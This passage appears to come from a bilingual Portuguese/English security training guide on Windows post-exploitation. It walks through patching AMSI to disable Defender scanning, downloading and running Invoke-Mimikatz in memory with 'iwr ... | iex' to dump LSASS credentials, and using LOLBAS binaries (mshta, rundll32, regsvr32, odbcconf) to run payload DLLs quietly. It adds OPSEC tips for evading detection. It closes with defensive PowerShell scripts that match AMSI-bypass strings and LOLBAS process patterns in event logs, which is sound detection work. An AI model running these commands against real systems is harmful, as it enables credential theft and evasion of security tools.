2. Contexto e Relevância / Context and Relevance Original

O AMSI (Antimalware Scan Interface) é uma funcionalidade do Windows que se coloca entre motores de script (PowerShell, macros do Office) e o antivírus/EDR. Quando um script é executado, o runtime entrega o conteúdo ao AMSI para ser escaneado antes de correr. Isto torna a atividade em memória visível para as ferramentas de segurança. Os hackers tentam constantemente evitar que o conteúdo malicioso chegue ao AMSI, ou alterá-lo para não corresponder às regras de deteção . AMSI (Antimalware Scan Interface) is a Windows feature that sits between script engines (PowerShell, Office macros) and the antivirus/EDR. When a script executes, the runtime hands the content to AMSI to be scanned before running. This makes in-memory activity visible to security tools. Hackers constantly try to keep malicious content from reaching AMSI, or change it so it doesn't match detection rules .

3. AMSI Bypass Original

O primeiro passo é confirmar que o Windows Defender está ativo. Se estiver desligado, não é necessário bypass e podes avançar diretamente . The first step is to confirm that Windows Defender is running. If it's off, no bypass is needed and you can proceed directly . 
PS > Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'"
Com o Defender ativo, executa o script de bypass. O output esperado indica que o AMSI foi patchado com sucesso — a partir daí, o Defender não tem acesso às sessões PowerShell e qualquer script pode ser executado sem restrição . With Defender running, execute the bypass script. The expected output indicates AMSI was successfully patched — from then on, Defender has no access to PowerShell sessions and any script can be executed without restriction . 
PS > .\shantanukhande-amsi.ps1
⚠️ Nota importante / Important note:
Alguns artigos sugerem que fazer downgrade para PowerShell v2 ajuda a evadir deteção, mas isso já não é verdade. O Defender monitoriza ativamente todas as sessões e estes truques simples não funcionam mais . Some articles suggest downgrading to PowerShell v2 helps evade detection, but that is no longer true. Defender actively monitors all sessions and these simple tricks no longer work .

4. Invoke-Mimikatz Original

Com o AMSI patchado, podes executar o Mimikatz diretamente na sessão. O artigo usa a versão atualizada Invoke-Mimikatz.ps1 de g4uss47. Por razões de OPSEC, não se recomenda correr comandos Mimikatz que toquem outros hosts (podem ser detetados por produtos de segurança de rede). Em vez disso, faz dump local do LSASS . With AMSI patched, you can run Mimikatz directly in the session. The article uses the updated Invoke-Mimikatz.ps1 by g4uss47. For OPSEC reasons, running Mimikatz commands that touch other hosts is not recommended (they can be picked up by network security products). Instead, dump LSASS locally . 
PS > iwr http://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1 | iex
PS > Invoke-Mimikatz -DumpCreds
O resultado são credenciais do utilizador comprometido. Se o alvo for mais valioso (servidor, base de dados), podes esperar credenciais de Domain Admin . The result is the compromised user's credentials. If the target is more valuable (server, database), you can expect Domain Admin credentials .

5. LOLBAS Execution Original Complementar

O artigo "Survival Edition, Part 4" demonstra como executar scripts sem usar .ps1 diretamente, abusando de binários nativos do Windows (LOLBAS). Estes binários são benignos, nativos, e disponíveis em sistemas legados — e como são tão comuns, geram falsos positivos que drenam os defensores . The "Survival Edition, Part 4" article demonstrates how to execute scripts without using .ps1 directly, by abusing native Windows binaries (LOLBAS). These binaries are benign, native, and available on legacy systems — and because they are so common, they generate false positives that drain defenders .

5.1 cscript.exe

PS > cscript //E:JScript //Nologo C:\Temp\script.js
Executa VBScript ou JScript. //E:JScript seleciona o motor JavaScript; //Nologo esconde o cabeçalho. É menos monitorizado que PowerShell em alguns ambientes e parece automação legada . Runs VBScript or JScript. //E:JScript selects the JavaScript engine; //Nologo hides the header. It's less watched than PowerShell in some environments and looks like legacy automation .

5.2 wscript.exe

PS > wscript.exe //E:VBScript C:\Temp\enum.vbs //B
//B corre em modo batch (sem message boxes). O script VBScript é executado pelo Windows Script Host . //B runs in batch mode (no message boxes). The VBScript is executed by Windows Script Host .

5.3 mshta.exe

PS > mshta users.hta
Executa uma HTML Application com código embebido. Pode criar um objeto WScript e executar comandos. Parece um componente web/UI e contorna algumas regras de script . Runs an HTML Application with embedded code. It can create a WScript object and execute commands. It looks like a web/UI component and bypasses some script-only rules .

5.4 rundll32.exe

C:\> rundll32.exe C:\reflective_dll.x64.dll,TestEntry
Carrega uma DLL e chama a função exportada. É um binário de sistema comum, pelo que a atividade se mistura com passos normais de instalação . Loads a DLL and calls the exported function. It's a common system binary, so activity blends into normal installer steps .

5.5 regsvr32.exe

PS > regsvr32.exe /u /s .\reflective_dll.x64.dll
/s torna a execução silenciosa. Operações de registo são normais em workflows de IT, pelo que a chamada pode passar despercebida . /s makes execution silent. Registration operations are normal in IT workflows, so the call can be overlooked .

5.6 odbcconf.exe

# Executar DLL gerada via msfvenom
PS > odbcconf.exe /S /A {REGSVR "C:\Temp\payload.dll"}
Normalmente ajuda programas a ligar-se a bases de dados. Pode ser abusado para executar DLLs . Normally helps programs connect to databases. It can be abused to execute DLLs .

6.1 Script 23.1 — Deteção de AMSI Bypass / AMSI Bypass Detection

Objetivo: detetar strings de bypass AMSI em Script Block Logging (4104). Evidência: amsi-bypass-detect.csv. Goal: detect AMSI bypass strings in Script Block Logging (4104). Evidence: amsi-bypass-detect.csv. 
# Script 23.1 - AMSI Bypass Detection
$out = ".\amsi-bypass-detect.csv"
$patterns = @("amsiutils", "AmsiScanBuffer", "amsiInitFailed", "shantanukhande", "amsiContext")
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    $msg = $_.Message
    foreach ($p in $patterns) {
      if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] AMSI bypass hits: $($hits.Count) -> $out" -ForegroundColor Red

6.3 Script 23.3 — Deteção de LOLBAS Execution / LOLBAS Detection

Objetivo: detetar execução de cscript, wscript, mshta, rundll32, regsvr32 ou odbcconf com argumentos suspeitos (URLs, caminhos em Temp). Evidência: lolbas-exec-detect.csv. Goal: detect cscript, wscript, mshta, rundll32, regsvr32, or odbcconf execution with suspicious arguments (URLs, Temp paths). Evidence: lolbas-exec-detect.csv. 
# Script 23.3 - LOLBAS Execution Detection
$out = ".\lolbas-exec-detect.csv"
$patterns = @("cscript\.exe", "wscript\.exe", "mshta\.exe", "rundll32\.exe", "regsvr32\.exe", "odbcconf\.exe")
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $proc = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
    $cmd  = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    foreach ($p in $patterns) {
      if ($proc -match $p -and ($cmd -match "http" -or $cmd -match "Temp" -or $cmd -match "Public")) {
        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Process=$proc; Command=$cmd }
      }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] LOLBAS execution hits: $($hits.Count) -> $out" -ForegroundColor Yellow
